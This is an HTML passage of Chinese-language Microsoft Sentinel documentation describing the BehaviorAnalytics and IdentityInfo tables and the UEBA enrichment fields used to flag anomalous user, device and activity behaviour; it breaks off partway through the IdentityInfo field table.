+<p><strong>BehaviorAnalytics 表</strong><br>下表说明了 Microsoft Sentinel 中每个<a class="link" target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/azure/sentinel/identify-threats-with-entity-behavior-analytics#how-to-use-entity-pages">实体详细信息页<i class="fas fa-external-link-alt"></i></a>上显示的行为分析数据。</p>
+<table>
+<thead>
+<tr>
+<th><strong>字段</strong></th>
+<th><strong>类型</strong></th>
+<th><strong>说明</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>TenantId</strong></td>
+<td>string</td>
+<td>租户的唯一 ID 编号。</td>
+</tr>
+<tr>
+<td><strong>SourceRecordId</strong></td>
+<td>字符串</td>
+<td>EBA 事件的唯一 ID 编号。</td>
+</tr>
+<tr>
+<td><strong>TimeGenerated</strong></td>
+<td>datetime</td>
+<td>活动发生时的时间戳。</td>
+</tr>
+<tr>
+<td><strong>TimeProcessed</strong></td>
+<td>datetime</td>
+<td>EBA 引擎处理活动时的时间戳。</td>
+</tr>
+<tr>
+<td><strong>ActivityType</strong></td>
+<td>字符串</td>
+<td>活动的高级类别。</td>
+</tr>
+<tr>
+<td><strong>ActionType</strong></td>
+<td>字符串</td>
+<td>活动的规范化名称。</td>
+</tr>
+<tr>
+<td><strong>UserName</strong></td>
+<td>字符串</td>
+<td>发起活动的用户的用户名。</td>
+</tr>
+<tr>
+<td><strong>UserPrincipalName</strong></td>
+<td>字符串</td>
+<td>发起活动的用户的完整用户名。</td>
+</tr>
+<tr>
+<td><strong>EventSource</strong></td>
+<td>字符串</td>
+<td>提供原始事件的数据源。</td>
+</tr>
+<tr>
+<td><strong>SourceIPAddress</strong></td>
+<td>字符串</td>
+<td>发起活动的 IP 地址。</td>
+</tr>
+<tr>
+<td><strong>SourceIPLocation</strong></td>
+<td>字符串</td>
+<td>发起活动的国家/地区，从 IP 地址进行扩充。</td>
+</tr>
+<tr>
+<td><strong>SourceDevice</strong></td>
+<td>字符串</td>
+<td>发起活动的设备的主机名。</td>
+</tr>
+<tr>
+<td><strong>DestinationIPAddress</strong></td>
+<td>字符串</td>
+<td>活动目标的 IP 地址。</td>
+</tr>
+<tr>
+<td><strong>DestinationIPLocation</strong></td>
+<td>字符串</td>
+<td>活动目标所在国家/地区，从 IP 地址进行扩充。</td>
+</tr>
+<tr>
+<td><strong>DestinationDevice</strong></td>
+<td>字符串</td>
+<td>目标设备的名称。</td>
+</tr>
+<tr>
+<td><strong>UsersInsights</strong></td>
+<td>动态</td>
+<td>相关用户的上下文扩充（<a class="link" target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/azure/sentinel/ueba-enrichments#usersinsights-field">详细信息如下<i class="fas fa-external-link-alt"></i></a>）。</td>
+</tr>
+<tr>
+<td><strong>DevicesInsights</strong></td>
+<td>动态</td>
+<td>相关设备的上下文扩充（<a class="link" target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/azure/sentinel/ueba-enrichments#devicesinsights-field">详细信息如下<i class="fas fa-external-link-alt"></i></a>）。</td>
+</tr>
+<tr>
+<td><strong>ActivityInsights</strong></td>
+<td>动态</td>
+<td>基于我们的分析的活动的上下文分析（<a class="link" target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/azure/sentinel/ueba-enrichments#activityinsights-field">详细信息如下<i class="fas fa-external-link-alt"></i></a>）。</td>
+</tr>
+<tr>
+<td><strong>InvestigationPriority</strong></td>
+<td>int</td>
+<td>异常分数，介于 0-10（0=良性，10=高度异常）。</td>
+</tr>
+</tbody></table>
+<p><strong>实体扩充动态字段</strong></p>
+<p><strong>UsersInsights 字段</strong><br>下表说明了 BehaviorAnalytics 表中 UsersInsights 动态字段中提供的扩充：</p>
+<table>
+<thead>
+<tr>
+<th><strong>扩充名称</strong></th>
+<th><strong>说明</strong></th>
+<th><strong>示例值</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>帐户显示名称</strong></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><em>(AccountDisplayName)</em></td>
+<td>用户的帐户显示名称。</td>
+<td>Admin、Hayden Cook</td>
+</tr>
+<tr>
+<td><strong>帐户域</strong></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><em>(AccountDomain)</em></td>
+<td>用户的帐户域名。</td>
+<td><strong>帐户对象 ID</strong></td>
+</tr>
+<tr>
+<td><em>(AccountObjectID)</em></td>
+<td>用户的帐户对象 ID。</td>
+<td>a58df659-5cab-446c-9dd0-5a3af20ce1c2</td>
+</tr>
+<tr>
+<td><strong>冲击半径</strong></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><em>(BlastRadius)</em></td>
+<td>冲击半径根据多个因素来计算：用户在组织树中的位置，以及用户的 Azure Active Directory 角色和权限。</td>
+<td>低、中、高</td>
+</tr>
+<tr>
+<td><strong>休眠帐户</strong></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><em>(IsDormantAccount)</em></td>
+<td>此帐户在过去 180 天内未使用。</td>
+<td>True、False</td>
+</tr>
+<tr>
+<td><strong>本地管理员</strong></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><em>(IsLocalAdmin)</em></td>
+<td>此帐户具有本地管理员权限。</td>
+<td>True、False</td>
+</tr>
+<tr>
+<td><strong>新帐户</strong></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><em>(IsNewAccount)</em></td>
+<td>此帐户是在过去 30 天内创建的。</td>
+<td>True、False</td>
+</tr>
+<tr>
+<td><strong>本地 SID</strong></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><em>(OnPremisesSID)</em></td>
+<td>与该操作相关的用户的本地 SID。</td>
+<td>S-1-5-21-1112946627-1321165628-2437342228-1103</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<p><strong>DevicesInsights 字段</strong><br>下表说明了 BehaviorAnalytics 表中 DevicesInsights 动态字段中提供的扩充：</p>
+<table>
+<thead>
+<tr>
+<th><strong>扩充名称</strong></th>
+<th><strong>说明</strong></th>
+<th><strong>示例值</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>浏览器</strong></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><em>(Browser)</em></td>
+<td>操作中使用的浏览器。</td>
+<td>Edge、Chrome</td>
+</tr>
+<tr>
+<td><strong>设备系列</strong></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><em>(DeviceFamily)</em></td>
+<td>操作中使用的设备系列。</td>
+<td>Windows</td>
+</tr>
+<tr>
+<td><strong>设备类型</strong></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><em>(DeviceType)</em></td>
+<td>操作中使用的客户端设备类型</td>
+<td>桌面</td>
+</tr>
+<tr>
+<td><strong>ISP</strong></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><em>(ISP)</em></td>
+<td>操作中使用的 Internet 服务提供商。</td>
+<td></td>
+</tr>
+<tr>
+<td><strong>操作系统</strong></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><em>(OperatingSystem)</em></td>
+<td>操作中使用的操作系统。</td>
+<td>Windows 10</td>
+</tr>
+<tr>
+<td><strong>威胁 intel 指标说明</strong></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><em>(ThreatIntelIndicatorDescription)</em></td>
+<td>从操作中使用的 IP 地址解析的观察到的威胁指标的说明。</td>
+<td>主机是僵尸网络的成员：azorult</td>
+</tr>
+<tr>
+<td><strong>威胁 intel 指标类型</strong></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><em>(ThreatIntelIndicatorType)</em></td>
+<td>从操作中使用的 IP 地址解析的威胁指标的类型。</td>
+<td>僵尸网络、C2、CryptoMining、Darknet、Ddos、MaliciousUrl、恶意软件、仿冒、代理、PUA、播放列表</td>
+</tr>
+<tr>
+<td><strong>用户代理</strong></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><em>(UserAgent)</em></td>
+<td>操作中使用的用户代理。</td>
+<td>Microsoft Azure Graph Client Library 1.0、</td>
+</tr>
+<tr>
+<td>Swagger-Codegen/1.4.0.0/csharp,</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>EvoSTS</td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><strong>用户代理系列</strong></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><em>(UserAgentFamily)</em></td>
+<td>操作中使用的用户代理系列。</td>
+<td>Chrome、Edge、Firefox</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<p><strong>ActivityInsights 字段</strong><br>下表说明了 BehaviorAnalytics 表中 ActivityInsights 动态字段中提供的扩充：</p>
+<p><strong>已执行的操作</strong></p>
+<table>
+<thead>
+<tr>
+<th><strong>扩充名称</strong></th>
+<th><a class="link" target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/azure/sentinel/ueba-enrichments#baseline-explained">基线<i class="fas fa-external-link-alt"></i></a><strong>（天）</strong></th>
+<th><strong>说明</strong></th>
+<th><strong>示例值</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>用户首次执行的操作</strong></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><em>(FirstTimeUserPerformedAction)</em></td>
+<td>180</td>
+<td>用户首次执行此操作。</td>
+<td>True、False</td>
+</tr>
+<tr>
+<td><strong>用户不常执行的操作</strong></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><em>(ActionUncommonlyPerformedByUser)</em></td>
+<td>10</td>
+<td>用户不常执行此操作。</td>
+<td>True、False</td>
+</tr>
+<tr>
+<td><strong>对等机之间不常执行的操作</strong></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><em>(ActionUncommonlyPerformedAmongPeers)</em></td>
+<td>180</td>
+<td>用户的对等机之间不常执行此操作。</td>
+<td>True、False</td>
+</tr>
+<tr>
+<td><strong>首次在租户中执行的操作</strong></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><em>(FirstTimeActionPerformedInTenant)</em></td>
+<td>180</td>
+<td>此操作由组织中的任何人首次执行。</td>
+<td>True、False</td>
+</tr>
+<tr>
+<td><strong>租户中不常执行的操作</strong></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><em>(ActionUncommonlyPerformedInTenant)</em></td>
+<td>180</td>
+<td>组织中不常执行此操作。</td>
+<td>True、False</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<p><strong>使用的应用</strong></p>
+<table>
+<thead>
+<tr>
+<th><strong>扩充名称</strong></th>
+<th><a class="link" target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/azure/sentinel/ueba-enrichments#baseline-explained">基线<i class="fas fa-external-link-alt"></i></a><strong>（天）</strong></th>
+<th><strong>说明</strong></th>
+<th><strong>示例值</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>用户首次使用的应用</strong></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><em>(FirstTimeUserUsedApp)</em></td>
+<td>180</td>
+<td>用户首次使用此应用。</td>
+<td>True、False</td>
+</tr>
+<tr>
+<td><strong>用户不常使用的应用</strong></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><em>(AppUncommonlyUsedByUser)</em></td>
+<td>10</td>
+<td>用户不常使用此应用。</td>
+<td>True、False</td>
+</tr>
+<tr>
+<td><strong>在对等机之间不常使用的应用</strong></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><em>(AppUncommonlyUsedAmongPeers)</em></td>
+<td>180</td>
+<td>在用户的对等机之间不常使用此应用。</td>
+<td>True、False</td>
+</tr>
+<tr>
+<td><strong>首次在租户中观察到的应用</strong></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><em>(FirstTimeAppObservedInTenant)</em></td>
+<td>180</td>
+<td>在组织中首次观察到此应用。</td>
+<td>True、False</td>
+</tr>
+<tr>
+<td><strong>租户中不常使用的应用</strong></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><em>(AppUncommonlyUsedInTenant)</em></td>
+<td>180</td>
+<td>组织中不常使用此应用。</td>
+<td>True、False</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<p><strong>使用的浏览器</strong></p>
+<table>
+<thead>
+<tr>
+<th><strong>扩充名称</strong></th>
+<th><a class="link" target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/azure/sentinel/ueba-enrichments#baseline-explained">基线<i class="fas fa-external-link-alt"></i></a><strong>（天）</strong></th>
+<th><strong>说明</strong></th>
+<th><strong>示例值</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>用户首次通过浏览器连接</strong></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><em>(FirstTimeUserConnectedViaBrowser)</em></td>
+<td>30</td>
+<td>用户首次观察到此浏览器。</td>
+<td>True、False</td>
+</tr>
+<tr>
+<td><strong>用户不常使用的浏览器</strong></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><em>(BrowserUncommonlyUsedByUser)</em></td>
+<td>10</td>
+<td>用户不常使用此浏览器。</td>
+<td>True、False</td>
+</tr>
+<tr>
+<td><strong>在对等机之间不常使用的浏览器</strong></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><em>(BrowserUncommonlyUsedAmongPeers)</em></td>
+<td>30</td>
+<td>在用户的对等机之间不常使用此浏览器。</td>
+<td>True、False</td>
+</tr>
+<tr>
+<td><strong>首次在租户中观察到的浏览器</strong></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><em>(FirstTimeBrowserObservedInTenant)</em></td>
+<td>30</td>
+<td>在组织中首次观察到此浏览器。</td>
+<td>True、False</td>
+</tr>
+<tr>
+<td><strong>租户中不常使用的浏览器</strong></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><em>(BrowserUncommonlyUsedInTenant)</em></td>
+<td>30</td>
+<td>组织中不常使用此浏览器。</td>
+<td>True、False</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<p><strong>从其连接的国家/地区</strong></p>
+<table>
+<thead>
+<tr>
+<th><strong>扩充名称</strong></th>
+<th><a class="link" target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/azure/sentinel/ueba-enrichments#baseline-explained">基线<i class="fas fa-external-link-alt"></i></a><strong>（天）</strong></th>
+<th><strong>说明</strong></th>
+<th><strong>示例值</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>用户首次从国家/地区连接</strong></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><em>(FirstTimeUserConnectedFromCountry)</em></td>
+<td>90</td>
+<td>用户首次从 IP 地址解析的这个地理位置连接。</td>
+<td>True、False</td>
+</tr>
+<tr>
+<td><strong>用户不常从其连接的国家/地区</strong></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><em>(CountryUncommonlyConnectedFromByUser)</em></td>
+<td>10</td>
+<td>用户不常从 IP 地址解析的这个地理位置连接。</td>
+<td>True、False</td>
+</tr>
+<tr>
+<td><strong>在对等机之间不常从其连接的国家/地区</strong></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><em>(CountryUncommonlyConnectedFromAmongPeers)</em></td>
+<td>90</td>
+<td>用户的对等机之间不常从 IP 地址解析的这个地理位置连接。</td>
+<td>True、False</td>
+</tr>
+<tr>
+<td><strong>首次从租户中观察到的国家/地区连接</strong></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><em>(FirstTimeConnectionFromCountryObservedInTenant)</em></td>
+<td>90</td>
+<td>组织中的任何人首次从该国家/地区连接。</td>
+<td>True、False</td>
+</tr>
+<tr>
+<td><strong>租户中不常从其连接的国家/地区</strong></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><em>(CountryUncommonlyConnectedFromInTenant)</em></td>
+<td>90</td>
+<td>组织中不常从 IP 地址解析的这个地理位置连接。</td>
+<td>True、False</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<p><strong>用于连接的设备</strong></p>
+<table>
+<thead>
+<tr>
+<th><strong>扩充名称</strong></th>
+<th><a class="link" target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/azure/sentinel/ueba-enrichments#baseline-explained">基线<i class="fas fa-external-link-alt"></i></a><strong>（天）</strong></th>
+<th><strong>说明</strong></th>
+<th><strong>示例值</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>用户首次从设备连接</strong></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><em>(FirstTimeUserConnectedFromDevice)</em></td>
+<td>30</td>
+<td>用户首次从该源设备连接。</td>
+<td>True、False</td>
+</tr>
+<tr>
+<td><strong>用户不常使用的设备</strong></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><em>(DeviceUncommonlyUsedByUser)</em></td>
+<td>10</td>
+<td>用户不常使用此设备。</td>
+<td>True、False</td>
+</tr>
+<tr>
+<td><strong>在对等机之间不常使用的设备</strong></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><em>(DeviceUncommonlyUsedAmongPeers)</em></td>
+<td>180</td>
+<td>在用户的对等机之间不常使用此设备。</td>
+<td>True、False</td>
+</tr>
+<tr>
+<td><strong>首次在租户中观察到的设备</strong></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><em>(FirstTimeDeviceObservedInTenant)</em></td>
+<td>30</td>
+<td>此设备首次在组织中观察到。</td>
+<td>True、False</td>
+</tr>
+<tr>
+<td><strong>租户中不常使用的设备</strong></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><em>(DeviceUncommonlyUsedInTenant)</em></td>
+<td>180</td>
+<td>组织中不常使用此设备。</td>
+<td>True、False</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<p><strong>其他相关设备</strong></p>
+<table>
+<thead>
+<tr>
+<th><strong>扩充名称</strong></th>
+<th><a class="link" target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/azure/sentinel/ueba-enrichments#baseline-explained">基线<i class="fas fa-external-link-alt"></i></a><strong>（天）</strong></th>
+<th><strong>说明</strong></th>
+<th><strong>示例值</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>用户首次登录到设备</strong></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><em>(FirstTimeUserLoggedOnToDevice)</em></td>
+<td>180</td>
+<td>用户首次连接到此目标设备。</td>
+<td>True、False</td>
+</tr>
+<tr>
+<td><strong>租户中不常使用的设备系列</strong></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><em>(DeviceFamilyUncommonlyUsedInTenant)</em></td>
+<td>30</td>
+<td>组织中不常使用此设备系列。</td>
+<td>True、False</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<p><strong>用于连接的 Internet 服务提供商</strong></p>
+<table>
+<thead>
+<tr>
+<th><strong>扩充名称</strong></th>
+<th><a class="link" target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/azure/sentinel/ueba-enrichments#baseline-explained">基线<i class="fas fa-external-link-alt"></i></a><strong>（天）</strong></th>
+<th><strong>说明</strong></th>
+<th><strong>示例值</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>用户首次通过 ISP 连接</strong></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><em>(FirstTimeUserConnectedViaISP)</em></td>
+<td>30</td>
+<td>用户首次观察到此 ISP。</td>
+<td>True、False</td>
+</tr>
+<tr>
+<td><strong>用户不常使用的 ISP</strong></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><em>(ISPUncommonlyUsedByUser)</em></td>
+<td>10</td>
+<td>用户不常使用此 ISP。</td>
+<td>True、False</td>
+</tr>
+<tr>
+<td><strong>在对等机之间不常使用的 ISP</strong></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><em>(ISPUncommonlyUsedAmongPeers)</em></td>
+<td>30</td>
+<td>在用户的对等机之间不常使用此 ISP。</td>
+<td>True、False</td>
+</tr>
+<tr>
+<td><strong>首次在租户中通过 ISP 连接</strong></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><em>(FirstTimeConnectionViaISPInTenant)</em></td>
+<td>30</td>
+<td>在组织中首次观察到此 ISP。</td>
+<td>True、False</td>
+</tr>
+<tr>
+<td><strong>租户中不常使用的 ISP</strong></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><em>(ISPUncommonlyUsedInTenant)</em></td>
+<td>30</td>
+<td>组织中不常使用此 ISP。</td>
+<td>True、False</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<p><strong>访问的资源</strong></p>
+<table>
+<thead>
+<tr>
+<th><strong>扩充名称</strong></th>
+<th><a class="link" target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/azure/sentinel/ueba-enrichments#baseline-explained">基线<i class="fas fa-external-link-alt"></i></a><strong>（天）</strong></th>
+<th><strong>说明</strong></th>
+<th><strong>示例值</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>用户首次访问的资源</strong></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><em>(FirstTimeUserAccessedResource)</em></td>
+<td>180</td>
+<td>此资源由用户首次访问。</td>
+<td>True、False</td>
+</tr>
+<tr>
+<td><strong>用户不常访问的资源</strong></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><em>(ResourceUncommonlyAccessedByUser)</em></td>
+<td>10</td>
+<td>用户不常访问该资源。</td>
+<td>True、False</td>
+</tr>
+<tr>
+<td><strong>在对等机之间不常访问的资源</strong></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><em>(ResourceUncommonlyAccessedAmongPeers)</em></td>
+<td>180</td>
+<td>在用户的对等机之间不常访问该资源。</td>
+<td>True、False</td>
+</tr>
+<tr>
+<td><strong>首次在租户中访问的资源</strong></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><em>(FirstTimeResourceAccessedInTenant)</em></td>
+<td>180</td>
+<td>此资源由组织中的任何人首次访问。</td>
+<td>True、False</td>
+</tr>
+<tr>
+<td><strong>租户中不常访问的资源</strong></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><em>(ResourceUncommonlyAccessedInTenant)</em></td>
+<td>180</td>
+<td>组织中不常访问此资源。</td>
+<td>True、False</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<p><strong>杂项</strong></p>
+<table>
+<thead>
+<tr>
+<th><strong>扩充名称</strong></th>
+<th><a class="link" target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/azure/sentinel/ueba-enrichments#baseline-explained">基线<i class="fas fa-external-link-alt"></i></a><strong>（天）</strong></th>
+<th><strong>说明</strong></th>
+<th><strong>示例值</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>用户上次执行的操作</strong></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><em>(LastTimeUserPerformedAction)</em></td>
+<td>180</td>
+<td>上次用户执行了相同的操作。</td>
+<td><Timestamp></Timestamp></td>
+</tr>
+<tr>
+<td><strong>过去未执行类似操作</strong></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><em>(SimilarActionWasn’tPerformedInThePast)</em></td>
+<td>30</td>
+<td>用户未在相同的资源提供程序中执行任何操作。</td>
+<td>True、False</td>
+</tr>
+<tr>
+<td><strong>源 IP 位置</strong></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><em>(SourceIPLocation)</em></td>
+<td>空值</td>
+<td>此国家/地区从操作的源 IP 解析。</td>
+<td>[英国萨里]</td>
+</tr>
+<tr>
+<td><strong>不常见的大量操作</strong></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><em>(UncommonHighVolumeOfOperations)</em></td>
+<td>7</td>
+<td>用户在同一个提供程序中执行了一连串类似操作</td>
+<td>True、False</td>
+</tr>
+<tr>
+<td><strong>Azure AD 条件访问失败的异常数量</strong></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><em>(UnusualNumberOfAADConditionalAccessFailures)</em></td>
+<td>5</td>
+<td>由于条件访问导致无法进行身份验证的用户的异常数量</td>
+<td>True、False</td>
+</tr>
+<tr>
+<td><strong>添加的异常数量的设备</strong></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><em>(UnusualNumberOfDevicesAdded)</em></td>
+<td>5</td>
+<td>用户添加了异常数量的设备。</td>
+<td>True、False</td>
+</tr>
+<tr>
+<td><strong>删除的异常数量的设备</strong></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><em>(UnusualNumberOfDevicesDeleted)</em></td>
+<td>5</td>
+<td>用户删除了异常数量的设备。</td>
+<td>True、False</td>
+</tr>
+<tr>
+<td><strong>添加到组中的异常数量的用户</strong></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td><em>(UnusualNumberOfUsersAddedToGroup)</em></td>
+<td>5</td>
+<td>用户向组中添加了异常数量的用户。</td>
+<td>True、False</td>
+</tr>
+<tr>
+<td></td>
+<td></td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<p><strong>IdentityInfo 表（公开预览版）</strong><br>为 Microsoft Sentinel 工作区<a class="link" target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/azure/sentinel/enable-entity-behavior-analytics">启用 UEBA<i class="fas fa-external-link-alt"></i></a> 后，来自 Azure Active Directory 的数据将同步到 Log Analytics 中的 IdentityInfo 表以在 Microsoft Sentinel 中使用。 可以在分析规则中嵌入从 Azure AD 同步的用户数据，以增强分析来适应你的用例并减少误报。<br>虽然初始同步可能需要几天时间，但在数据完全同步后，将获得以下优势：</p>
+<ul>
+<li><pre><code>    对 Azure AD 中的用户配置文件所做的更改会在 15 分钟内更新到 IdentityInfo 表中。
+</code></pre>
+</li>
+<li><pre><code>    组和角色信息每天在 IdentityInfo 表和 Azure AD 之间同步。
+</code></pre>
+</li>
+<li><pre><code>    每 21 天，Microsoft Sentinel 会与整个 Azure AD 重新同步，以确保过时的记录将完全更新。
+</code></pre>
+</li>
+<li><pre><code>    IdentityInfo 表中的默认保留时间为 30 天。
+</code></pre>
+</li>
+</ul>
+<p><strong>备注</strong><br>目前，仅支持内置角色。<br>目前不支持有关已删除组（从组中删除了用户）的数据。<br>下表描述了 Log Analytics 的 IdentityInfo 表中包含的用户身份数据。</p>
+<table>
+<thead>
+<tr>
+<th><strong>字段</strong></th>
+<th><strong>类型</strong></th>
+<th><strong>说明</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>AccountCloudSID</strong></td>
+<td>string</td>
+<td>帐户的 Azure AD 安全标识符。</td>
+</tr>
+<tr>
+<td><strong>AccountCreationTime</strong></td>
+<td>datetime</td>
+<td>创建用户帐户的日期 (UTC)。</td>
+</tr>
+<tr>
+<td><strong>AccountDisplayName</strong></td>
+<td>string</td>
+<td>用户帐户的显示名称。</td>
+</tr>
+<tr>
+<td><strong>AccountDomain</strong></td>
+<td>string</td>
+<td>用户帐户的域名。</td>
+</tr>
+<tr>
+<td><strong>AccountName</strong></td>
+<td>string</td>
+<td>用户帐户的用户名。</td>
+</tr>
+<tr>
+<td><strong>AccountObjectId</strong></td>
+<td>string</td>
+<td>用户帐户的 Azure Active Directory 对象 ID。</td>
+</tr>
+<tr>
+<td><strong>AccountSID</strong></td>
+<td>string</td>
+<td>用户帐户的本地安全标识符。</td>
+</tr>
+<tr>
+<td><strong>AccountTenantId</strong></td>
+<td>string</td>
+<td>用户帐户的 Azure Active Directory 租户 ID。</td>
+</tr>
+<tr>
+<td><strong>AccountUPN</strong></td>
+<td>string</td>
+<td>用户帐户的用户主体名称。</td>
+</tr>
+<tr>
+<td><strong>AdditionalMailAddresses</strong></td>
+<td>动态</td>
+<td>用户的其他电子邮件地址。</td>
+</tr>
+<tr>
+<td><strong>AssignedRoles</strong></td>
+<td>动态</td>
+<td>为用户帐户分配的 Azure AD 角色。</td>
+</tr>
+<tr>
+<td><strong>城市</strong></td>
+<td>string</td>
+<td>用户帐户的城市。</td>
+</tr>
+<tr>
+<td><strong>国家/地区</strong></td>
+<td>string</td>
+<td>用户帐户的国家/地区。</td>
+</tr>
+<tr>
+<td><strong>DeletedDateTime</strong></td>
+<td>datetime</td>
+<td>删除用户的日期和时间。</td>
+</tr>
+<tr>
+<td><strong>部门</strong></td>
+<td>string</td>
+<td>用户帐户的部门。</td>
+</tr>
+<tr>
+<td><strong>GivenName</strong></td>
+<td>string</td>
+<td>用户帐户的给定名称。</td>
+</tr>
+<tr>
